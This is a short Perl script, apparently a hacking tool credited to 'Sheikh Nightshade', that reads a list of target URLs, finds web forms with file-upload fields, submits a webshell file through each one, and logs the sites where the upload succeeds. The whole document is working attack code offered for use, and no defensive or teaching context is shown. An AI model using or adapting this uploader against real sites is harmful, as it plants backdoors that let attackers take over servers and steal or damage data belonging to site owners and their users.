#!/usr/bin/perl
use strict;
use warnings;
use LWP::UserAgent;
use HTTP::Request::Common qw(POST);
use HTML::Form;
use Getopt::Long;

# Default values
my $webshell_file = 'webshell.php';
my $targets_file = 'targets.txt';
my $log_file = 'success.txt';

# Get command-line arguments
GetOptions(
    'webshell=s' => \$webshell_file,
    'targets=s'  => \$targets_file,
    'log=s'      => \$log_file,
) or die "Usage: $0 --webshell FILE --targets FILE --log FILE\n";

print "WebShell Uploader with Form Detection, By Sheikh Nightshade\n";

# Function to find upload forms on the target page
sub find_upload_form {
    my ($url) = @_;

    my $ua = LWP::UserAgent->new;

    my $response = $ua->get($url);

    if ($response->is_success) {
        my @forms = HTML::Form->parse($response);

        foreach my $form (@forms) {
            if ($form->find_input(undef, 'file')) {
                print "Found upload form at $url\n";
                return $form;
            }
        }
    } else {
        print "Failed to access $url: ", $response->status_line, "\n";
    }

    return undef;
}

# Function to upload webshell to the found form
sub upload_webshell {
    my ($url, $form) = @_;

    $form->find_input(undef, 'file')->value($webshell_file);

    my $ua = LWP::UserAgent->new;
    my $response = $ua->request($form->click);

    if ($response->is_success) {
        print "Successfully uploaded webshell to $url\n";
        open my $log_fh, '>>', $log_file or die "Could not open '$log_file': $!";
        print $log_fh "$url\n";
        close $log_fh;
        return 1;
    } else {
        print "Failed to upload to $url: ", $response->status_line, "\n";
        return 0;
    }
}

# Main function
sub main {
    open my $fh, '<', $targets_file or die "Could not open '$targets_file': $!";

    while (my $url = <$fh>) {
        chomp $url;
        next if $url eq '';

        print "Checking $url for upload forms...\n";

        my $form = find_upload_form($url);

        if ($form) {
            upload_webshell($url, $form);
        } else {
            print "No upload form found at $url\n";
        }
    }

    close $fh;
}

main();
